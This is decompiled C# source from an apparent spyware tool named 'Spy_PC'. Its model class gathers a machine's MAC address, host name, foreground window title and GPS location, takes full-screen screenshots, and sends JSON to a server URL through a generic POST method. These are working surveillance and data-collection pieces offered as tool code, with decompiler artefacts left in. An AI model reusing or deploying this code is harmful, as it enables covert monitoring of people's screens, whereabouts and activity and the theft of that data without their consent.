using System;
using System.Device.Location;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Spy_PC;

internal class model
{
	private Stream dataStream;

	private string status;

	[DllImport("wininet.dll")]
	private static extern bool InternetGetConnectedState(out int Description, int ReservedValue);

	public bool IsConnectedToInternet()
	{
		int Description;
		return InternetGetConnectedState(out Description, 0);
	}

	public string PostDataToServer(string url, string json)
	{
		Console.WriteLine("BaseURL : " + url);
		HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(new Uri(url));
		obj.Accept = "application/json";
		obj.ContentType = "application/json";
		obj.Method = "POST";
		byte[] bytes = Encoding.Default.GetBytes(json);
		json = Encoding.UTF8.GetString(bytes);
		string s = json;
		Console.WriteLine("Data posting : " + json);
		byte[] bytes2 = new ASCIIEncoding().GetBytes(s);
		Stream requestStream = obj.GetRequestStream();
		requestStream.Write(bytes2, 0, bytes2.Length);
		requestStream.Close();
		WebResponse response = obj.GetResponse();
		status = ((HttpWebResponse)response).StatusDescription;
		dataStream = response.GetResponseStream();
		StreamReader streamReader = new StreamReader(dataStream);
		string text = streamReader.ReadToEnd();
		streamReader.Close();
		dataStream.Close();
		response.Close();
		Console.WriteLine("Response Message : " + text);
		return text;
	}

	public string GetMACAddress2()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = string.Empty;
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (text == string.Empty)
			{
				text = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		return text;
	}

	public string getPC_Name()
	{
		return Dns.GetHostName();
	}

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	public string GetActiveWindowTitle()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (GetWindowText(GetForegroundWindow(), stringBuilder, 256) > 0)
		{
			return stringBuilder.ToString();
		}
		return null;
	}

	public string GetLocationProperty()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		GeoCoordinateWatcher val = new GeoCoordinateWatcher();
		val.TryStart(false, TimeSpan.FromMilliseconds(3000.0));
		GeoCoordinate location = val.get_Position().get_Location();
		if (!location.get_IsUnknown())
		{
			Console.WriteLine("Lat: {0}, Long: {1}", location.get_Latitude(), location.get_Longitude());
			return location.get_Latitude() + "," + location.get_Longitude();
		}
		Console.WriteLine("Unknown latitude and longitude.");
		return "";
	}

	public void FullScreenshot(string filepath, string filename, ImageFormat format)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		Bitmap val = new Bitmap(bounds.Width, bounds.Height);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			string path = filepath + "\\" + filename;
			Image img = (Image)(object)val;
			SaveJpeg(path, img, 20);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static void SaveJpeg(string path, Image img, int quality)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (quality < 0 || quality > 100)
		{
			throw new ArgumentOutOfRangeException("quality must be between 0 and 100.");
		}
		EncoderParameter val = new EncoderParameter(Encoder.Quality, (long)quality);
		ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
		EncoderParameters val2 = new EncoderParameters(1);
		val2.get_Param()[0] = val;
		img.Save(path, encoderInfo, val2);
	}

	private static ImageCodecInfo GetEncoderInfo(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = 0;
		while (true)
		{
			if (num < imageEncoders.Length)
			{
				if (imageEncoders[num].get_MimeType() == mimeType)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return imageEncoders[num];
	}
}
